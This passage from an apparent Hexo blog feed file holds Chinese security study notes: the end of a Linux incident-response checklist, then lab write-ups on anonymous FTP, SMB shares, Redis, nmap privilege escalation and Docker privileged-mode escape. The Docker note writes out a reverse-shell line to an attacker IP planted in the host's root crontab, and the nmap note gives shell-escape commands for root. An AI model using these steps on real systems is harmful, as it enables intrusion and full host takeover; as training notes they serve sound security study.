class="line">lastb，看登录失败的情况，本质是将/var/log/btmp二进制文件格式化输出</span><br><span class="line">lastlog，查看用户上一次的登录情况，本质是将/var/log/lastlog二进制文件格式化输出</span><br><span class="line">last -x reboot/shutdown 查看重启/关机的记录</span><br><span class="line"></span><br><span class="line">查看历史命令: cat .bash_history</span><br><span class="line">如果黑客使用history -c清理相关的日志，使用cat ~/.bash_history仍可查看相关的记录，</span><br><span class="line">打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br></pre></td></tr></table></figure><p>‍</p><h3 id="六、进程检查"><a href="#六、进程检查" class="headerlink" title="六、进程检查"></a>六、进程检查</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">lsof -p PID               查看指定进程打开的文件</span><br><span class="line">lsof /filepath/filename   查看调用文件的进程</span><br><span class="line"></span><br><span class="line">进程隐藏及对应办法</span><br><span class="line">1、命令替换            检查命令文件md5值</span><br><span class="line">2、Hook系统调用：攻击者可以劫持getdents和libc中的readdir函数（修改内核中的系统调用代码或者修改lib中的函数代码）实现过滤特定进程名，从而实现进程隐藏。</span><br><span class="line">3、动态库劫持，如通过环境变量LD_PRELOAD使恶意链接的动态库先于系统标准库加载</span><br><span class="line">查看隐藏进程:</span><br><span class="line">ls /proc | sort -n |uniq &gt;2 </span><br><span class="line">可应对2和3方法，或查看/proc下进程相关信息</span><br><span class="line">4、挂载目录到/proc下，原理为挂载一些空的路径到/proc对应进程号下面，ps等命令在遍历/proc时则没有办法找到该进程的信息</span><br><span class="line">应对方法：</span><br><span class="line">查看挂载情况: cat /proc/mount</span><br><span class="line">5、内核态隐藏，劫持VFS接口层或劫持系统调用，这两个方法要么修改内核，要么新增内核模块，修改内核需要重启，加载内核模块不需要。</span><br><span class="line">应对方法：</span><br><span class="line">查看内核编译时间: uname -a</span><br><span class="line">查看内核模块   : lsmod</span><br><span class="line"></span><br><span class="line">进程内存检查</span><br><span class="line">dump进程内存环境，可使用系统自带gdb调试，strace？</span><br><span class="line">/proc/pid/maps   查看进程内存地址，堆中的信息比较全</span><br><span class="line"></span><br><span class="line">gdb attach pid attach到pid对应的进程，</span><br><span class="line">然后使用dump memory /filename start_address end_address将内存dump下来</span><br><span class="line"></span><br><span class="line">筛选出长度大于10的字符串:kali</span><br><span class="line">strings -n 10 filename</span><br></pre></td></tr></table></figure><h3 id="七、日志分析"><a href="#七、日志分析" class="headerlink" title="七、日志分析"></a>七、日志分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">日志默认存放位置 ： </span><br><span class="line">/var/log/</span><br><span class="line">/var/log/secure   — 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH、VNC登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中，不过较新的linux系统已经弃用secure，改用auth.log记录</span><br><span class="line">/var/log/cron     — 记录了系统定时任务相关的日志</span><br><span class="line">/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。</span><br><span class="line">/var/log/faillog  – 包含用户登录失败信息，此外，错误登录命令也会记录在本文件中</span><br><span class="line"></span><br><span class="line">定位有多少IP在爆破主机的root帐号：</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line">爆破用户名字典是什么：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=<span class="tag">&lt;&gt;</span>)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">登录成功的IP有哪些：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line">ssh免密登录   查看根目录下的.ssh/目录，另外查看ssh配置文件中的RSAAuthentication和PubkeyAuthencation是否为yes</span><br><span class="line">增加用户的日志：grep &quot;useradd&quot; /var/log/secure</span><br><span class="line">删除用户的日志：grep &quot;userdel&quot; /var/log/secure</span><br><span class="line">/var/log/xferlog    主要记录FTP用户进行的一些上传下载行为</span><br><span class="line">/var/log/vsftpd.log 主要记录用户的登录日志</span><br></pre></td></tr></table></figure><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="一、windows进程排查工具"><a href="#一、windows进程排查工具" class="headerlink" title="一、windows进程排查工具"></a>一、windows进程排查工具</h4><ul><li><p>ProcessHacker</p></li><li><p>Autoruns</p></li><li><p>Sysinternals Utilities</p></li><li><p>火绒剑</p></li></ul><h4 id="二、windows-webshell扫描工具"><a href="#二、windows-webshell扫描工具" class="headerlink" title="二、windows webshell扫描工具"></a>二、windows webshell扫描工具</h4><ul><li><p>河马</p></li><li><p>D盾</p></li><li><p>深信服SfabAntiBot_X64查杀工具</p></li><li><p>火绒查杀</p></li></ul><h4 id="三、Windows-日志分析工具"><a href="#三、Windows-日志分析工具" class="headerlink" title="三、Windows 日志分析工具"></a>三、Windows 日志分析工具</h4><ul><li>evtxLogparse1.3</li></ul><h4 id="四、Windows-网络数据包分析工具"><a href="#四、Windows-网络数据包分析工具" class="headerlink" title="四、Windows 网络数据包分析工具"></a>四、Windows 网络数据包分析工具</h4><ul><li>wireshark</li></ul><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="一、Linux进程排查排查工具"><a href="#一、Linux进程排查排查工具" class="headerlink" title="一、Linux进程排查排查工具"></a>一、Linux进程排查排查工具</h4><ul><li>GScan 是一款开源的 Linux 应急响应工具</li></ul><h4 id="二、病毒查杀"><a href="#二、病毒查杀" class="headerlink" title="二、病毒查杀"></a>二、病毒查杀</h4><ul><li>rootkit查杀</li></ul><p>chkrootkit 工具（网址：<a href="https://link.zhihu.com/?target=http://www.chkrootkit.org">http://www.</a>​<a href="https://link.zhihu.com/?target=http://www.chkrootkit.org"><strong>chkrootkit.org</strong></a>）进行 Rootkit 查杀</p><ul><li>ClanAV</li></ul><p>ClamAV 的官方下载地址为：<a href="https://link.zhihu.com/?target=http://www.clamav.net/download.html">http://www.</a>​<a href="https://link.zhihu.com/?target=http://www.clamav.net/download.html"><strong>clamav.net&#x2F;download.htm</strong></a>​<a href="https://link.zhihu.com/?target=http://www.clamav.net/download.html">l</a>，安装使用如下</p><p>开源病毒扫描程序，主要应用于邮件服务器，采用多线程后台操作，可以自动升级病毒库。</p><h4 id="三-、Webshell-查杀"><a href="#三-、Webshell-查杀" class="headerlink" title="三 、Webshell 查杀"></a>三 <strong>、Webshell 查杀</strong></h4><p>Linux 系统：</p><ul><li>河马 Webshell 查杀：<a href="https://link.zhihu.com/?target=http://www.shellpub.com">http://www.</a>​<a href="https://link.zhihu.com/?target=http://www.shellpub.com"><strong>shellpub.com</strong></a></li><li>深信服 Webshell 网站后门检测工具：<a href="https://link.zhihu.com/?target=http://edr.sangfor.com.cn/backdoor_detection.html">http:&#x2F;&#x2F;</a>​<a href="https://link.zhihu.com/?target=http://edr.sangfor.com.cn/backdoor_detection.html"><strong>edr.sangfor.com.cn&#x2F;back</strong></a>​<a href="https://link.zhihu.com/?target=http://edr.sangfor.com.cn/backdoor_detection.html">door_detection.html</a></li></ul><h2 id="在线情报社区"><a href="#在线情报社区" class="headerlink" title="在线情报社区"></a>在线情报社区</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">微步</span><br><span class="line">https://x.threatbook.cn/](https://x.threatbook.cn/</span><br><span class="line">VT</span><br><span class="line">https://www.virustotal.com/gui/home/upload](https://www.virustotal.com/gui/home/upload</span><br><span class="line">深信服勒索病毒查询平台</span><br><span class="line">https://edr.sangfor.com.cn/#/information/ransom_search](https://edr.sangfor.com.cn/#/information/ransom_search</span><br><span class="line"></span><br><span class="line">可疑木马shell，病毒、用在线沙箱检测</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTP匿名登录</title>
      <link href="/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/FTP%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/FTP%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="FTP匿名登录笔记"><a href="#FTP匿名登录笔记" class="headerlink" title="FTP匿名登录笔记"></a>FTP匿名登录笔记</h1><h2 id="FTP（File-Transfer-Protocol）"><a href="#FTP（File-Transfer-Protocol）" class="headerlink" title="FTP（File Transfer Protocol）"></a>FTP（File Transfer Protocol）</h2><p>是一种用于在计算机网络上传输文件的标准协议。它允许用户通过客户端和服务器之间的连接进行文件的上传、下载和管理。</p><p>以下是一些关于FTP服务的详细解释：</p><ol><li>客户端和服务器：FTP服务由两个主要组件组成：客户端和服务器。客户端是用户使用的应用程序，用于连接到FTP服务器并执行文件传输操作。服务器是运行FTP服务的计算机或设备，它负责接受客户端的连接请求并提供文件传输服务。</li><li>连接模式：FTP支持两种连接模式：主动模式（Active Mode）和被动模式（Passive Mode）。在主动模式下，客户端使用随机选择的端口连接到服务器的端口20进行数据传输。在被动模式下，服务器打开一个额外的端口（通常是端口21之外的端口），并告知客户端使用该端口进行数据传输。</li><li>认证和安全性：FTP服务器可以配置为需要用户进行身份验证才能访问文件。常见的认证方式包括使用用户名和密码进行登录，或使用匿名登录（anonymous）允许公共访问。为了增加安全性，可以使用TLS&#x2F;SSL协议对FTP连接进行加密。</li><li>文件操作：FTP服务允许用户执行各种文件操作，包括上传（将文件从客户端传输到服务器）、下载（将文件从服务器传输到客户端）、删除、重命名、创建目录等。</li><li>目录结构：FTP服务器通常具有层次化的目录结构，类似于文件系统。用户可以在服务器上创建目录、导航到不同的目录，并在不同的目录中进行文件操作。</li><li>FTP命令：FTP客户端使用一系列命令与服务器进行通信。常见的FTP命令包括：登录（LOGIN）、上传（PUT）、下载（GET）、列出目录（LIST）、改变目录（CD）、删除文件（DELETE）等。</li></ol><p>请注意，FTP是一种老旧的协议，它在过去被广泛使用，但现在已经有更安全和高效的替代方案，如SFTP（SSH File Transfer Protocol）和FTPS（FTP over SSL&#x2F;TLS）。这些协议提供了更好的安全性和功能，值得考虑在安全敏感的环境中使用。</p><p>FTP匿名登录，密码为空。</p><h2 id="nmap全端口扫描"><a href="#nmap全端口扫描" class="headerlink" title="nmap全端口扫描"></a>nmap全端口扫描</h2><ul><li>“| ftp-syst:”：FTP系统信息。</li><li>“| ftp-anon: Anonymous FTP login allowed (FTP code 230)”：允许匿名FTP登录。</li><li>“|_-rw-r–r– 1 0 0 32 Jun 04 2021 flag.txt”：列出了FTP服务器上的一个文件，文件名为flag.txt。</li></ul><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE170305-20240420170549-synjlx3.png" alt="屏幕截图 2023-09-18 170305">​</p><p>发现存在FTP匿名登录，并有一个flag.txt</p><h2 id="尝试FTP匿名登录："><a href="#尝试FTP匿名登录：" class="headerlink" title="尝试FTP匿名登录："></a>尝试FTP匿名登录：</h2><p>ftp <a href="mailto:&#x41;&#110;&#111;&#110;&#x6d;&#111;&#x75;&#115;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#57;&#46;&#x32;&#50;&#x34;&#46;&#49;&#x35;&#51;">&#x41;&#110;&#111;&#110;&#x6d;&#111;&#x75;&#115;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#57;&#46;&#x32;&#50;&#x34;&#46;&#49;&#x35;&#51;</a></p><p>get flag.txt</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE170340-20240420170557-eqy2by3.png" alt="屏幕截图 2023-09-18 170340">​</p><h2 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h2><p>flag下载到本地目录</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE170407-20240420170540-obi511o.png" alt="屏幕截图 2023-09-18 170407">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> FTP </tag>
            
            <tag> 匿名登录 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMB文件共享</title>
      <link href="/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SMB%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SMB%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SMB文件共享笔记"><a href="#SMB文件共享笔记" class="headerlink" title="SMB文件共享笔记"></a>SMB文件共享笔记</h1><p>SMB： 445<br>Server Message Block文件共享服务</p><p>Dancing靶机：</p><h2 id="nmap信息收集："><a href="#nmap信息收集：" class="headerlink" title="nmap信息收集："></a>nmap信息收集：</h2><p>445端口：SMB服务</p><p>​<img src="/assets/Dancing-nmap-20230919092124-29yb2hj.png" alt="Dancing-nmap">​</p><h2 id="查看靶机共享账户："><a href="#查看靶机共享账户：" class="headerlink" title="查看靶机共享账户："></a>查看靶机共享账户：</h2><p>在 linux 中，可以使用命令行工具smbclient对目标机器进行SMB服务的连接，</p><p>smbclient将尝试连接到远程主机，并检查是否需要任何身份验证。</p><p>smbclient -L IP</p><p>​<img src="/assets/smbclient-L-20230919092154-26rsn1y.png" alt="smbclient-L">​</p><h2 id="尝试登录共享账户–GETflag"><a href="#尝试登录共享账户–GETflag" class="headerlink" title="尝试登录共享账户–GETflag"></a>尝试登录共享账户–GETflag</h2><p>在列出的用户里，后面有美元符号$的都是管理员权限的，所以我们只能连接WorkShares这个用户</p><p>（除了WorkShares之外，其他三个都是默认共享的，可以用自己物理机输入命令net share就知道了）。</p><p>命令: smbclient &#x2F;&#x2F;IP&#x2F;&#x2F;用户</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE091414-20240420170453-apng2f5.png" alt="屏幕截图 2023-09-19 091414">​</p><h2 id="提交flag"><a href="#提交flag" class="headerlink" title="提交flag"></a>提交flag</h2><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE091822-20240420170515-srl4yqd.png" alt="屏幕截图 2023-09-19 091822">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 提权 </tag>
            
            <tag> SMB文件共享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker逃逸</title>
      <link href="/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8/"/>
      <url>/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><p> &#x2F;<a href="https://www.freebuf.com/articles/container/242763.html">初识Docker逃逸 - FreeBuf网络安全行业门户</a></p><p><a href="https://zhuanlan.zhihu.com/p/614513965">宸极实验室—『杂项』Docker 逃逸方法汇总 - 知乎 (zhihu.com)</a></p><h3 id="什么是docker逃逸："><a href="#什么是docker逃逸：" class="headerlink" title="什么是docker逃逸："></a>什么是docker逃逸：</h3><p>攻防中，拿到<code>webshell</code>​​后，发现自己是在<code>docker</code>​​容器中，拿到的并不是宿主机的权限，那我们就需要进一步渗透，就必须逃逸到宿主机中，拿到宿主机的权限。</p><h3 id="docker逃逸流程："><a href="#docker逃逸流程：" class="headerlink" title="docker逃逸流程："></a>docker逃逸流程：</h3><p>目前的 Docker 逃逸的原因可以划分为三种：</p><h4 id="由内核漏洞引起："><a href="#由内核漏洞引起：" class="headerlink" title="由内核漏洞引起："></a>由内核漏洞引起：</h4><p>Dirty COW(CVE-2016-5195)</p><p>在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。docker和宿主机共享内核</p><h4 id="软件设计引起："><a href="#软件设计引起：" class="headerlink" title="软件设计引起："></a>软件设计引起：</h4><p>CVE-2019-5736、CVE-2019-14271</p><p>Docker、containerd或者其他基于runc的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取到宿主机runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。</p><h4 id="由配置不当引起："><a href="#由配置不当引起：" class="headerlink" title="由配置不当引起："></a>由配置不当引起：</h4><p>开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式</p><p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备。<code>docker</code>​管理员可通过<code>mount</code>​命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，可直接通过<code>chroot</code>​切换根目录、写<code>ssh</code>​公钥和<code>crontab</code>​计划任何等逃逸到宿主机。</p><p>‍</p><h3 id="docker逃逸环境判断："><a href="#docker逃逸环境判断：" class="headerlink" title="docker逃逸环境判断："></a>docker逃逸环境判断：</h3><ul><li><p><strong>判断docker方法：</strong></p><ul><li><strong>1、使用下面命令，查看是否存在 dockerrnv 文件 ls -alh &#x2F;.dockerenv</strong></li><li><strong>2、查看系统进程的cgroup信息 cat &#x2F;proc&#x2F;1&#x2F;cgroup</strong></li></ul></li></ul><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE083034-20240420162429-n15jh9z.png" alt="屏幕截图083034">​</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE090314-20240420164004-tvir8yi.png" alt="屏幕截图090314">​</p><p>​</p><h3 id="docker特权模式逃逸流程："><a href="#docker特权模式逃逸流程：" class="headerlink" title="docker特权模式逃逸流程："></a>docker特权模式逃逸流程：</h3><h4 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h4><p>判断是否是特权模式启动，如果是以特权模式启动的话，<code>CapEff</code>​对应的掩码值应该为<code>0000003fffffffff</code>​。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status |grep Cap</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE083254-20240420164345-5bs30t7.png" alt="屏幕截图 2023-12-25 083254">​</p><h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>红日四靶场—docker特权模式逃逸：</p><h5 id="crontab​计划任务逃逸："><a href="#crontab​计划任务逃逸：" class="headerlink" title="crontab​计划任务逃逸："></a><code>crontab</code>​计划任务逃逸：</h5><p>在<code>docker</code>​容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">mkdir /hacker</span><br><span class="line">mount /dev/sda5 /hacker</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE083525-20240420164403-z3ycfp1.png" alt="屏幕截图 2023-12-25 083525">​</p><p>首先在<code>kali</code>​中使用<code>nc</code>​监听，进入到<code>hacker</code>​目录,通过<code>touch</code>​创建一个<code>sh</code>​文件，</p><p>再将<code>bash</code>​反弹命令写入到创建的<code>sh</code>​文件里面，在编写计划任务到<code>/hacker/etc/crontab</code>​文件中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /hacker/hacker.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.59.145/6666 0&gt;&amp;1&quot; &gt;/hacker/hacker.sh</span><br><span class="line">echo &quot;* * * * * root bash /hacker.sh&quot; &gt;&gt; /hacker/etc/crontab</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE083637-20240420164413-z4zbf8y.png" alt="屏幕截图 2023-12-25 083637">​</p><p>返回到<code>kali</code>​中进行查看，已成功接收到<code>shell</code>​</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE083704-20240420162418-cwa8tu9.png" alt="屏幕截图 2023-12-25 083704">​</p><h5 id="写入ssh公钥进行逃逸："><a href="#写入ssh公钥进行逃逸：" class="headerlink" title="写入ssh公钥进行逃逸："></a>写入ssh公钥进行逃逸：</h5><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
            <tag> docker逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap提权</title>
      <link href="/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/nmap%E6%8F%90%E6%9D%83/"/>
      <url>/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/nmap%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">存在root无密码运行nmap</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br><span class="line"></span><br><span class="line">第一个：</span><br><span class="line">#就是低版本可以用那个交互式</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">#查询可以用得suid</span><br><span class="line">#nmap老版本支持“interactive.”选项，用户能够通过该选项执行shell命令</span><br><span class="line">/usr/local/bin/nmap --interactive</span><br><span class="line">nmap --interactive  #即可得到交互式shell</span><br><span class="line">nmap&gt;</span><br><span class="line">#之后输入</span><br><span class="line">！sh</span><br><span class="line"></span><br><span class="line">#要求：</span><br><span class="line">nmap有s标志位</span><br><span class="line"></span><br><span class="line">+----</span><br><span class="line">nmap版本足够老</span><br><span class="line">------------------------------------------------</span><br><span class="line">第二个：</span><br><span class="line">nmap以root运行</span><br><span class="line">cat os.execute(&quot;/bin/sh&quot;) &gt; nse_root.nse</span><br><span class="line">#nse是nmap的插件扩展名</span><br><span class="line">nmap --script=/home/jens/nse_root.nse</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dnmap%E6%8F%90%E6%9D%83flag-20231016165111-ipzo8pk.png" alt="Dnmap提权flag">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 提权 </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis数据库</title>
      <link href="/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Redis%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2024/04/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Redis%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h1><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE164048-20240420165238-b9owslm.png" alt="屏幕截图 2023-09-22 164048">​</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>nmap -sS -sV -p- -T4 10.129.161.113</p><p>开放了 6379端口  redis服务</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE163442-20240420165250-6sqtvh4.png" alt="屏幕截图 2023-09-22 163442">​​</p><h2 id="登录redis"><a href="#登录redis" class="headerlink" title="登录redis"></a>登录redis</h2><p>redis-cli -h IP -p 6379</p><p>info  获取数据库信息</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE163514-20240420165258-temgju0.png" alt="屏幕截图 2023-09-22 163514">​​</p><p>select 0</p><p>dbsize</p><p>get flag</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE163543-20240420165305-fqz284v.png" alt="屏幕截图 2023-09-22 163543">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> MSF </tag>
            
            <tag> Redis数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
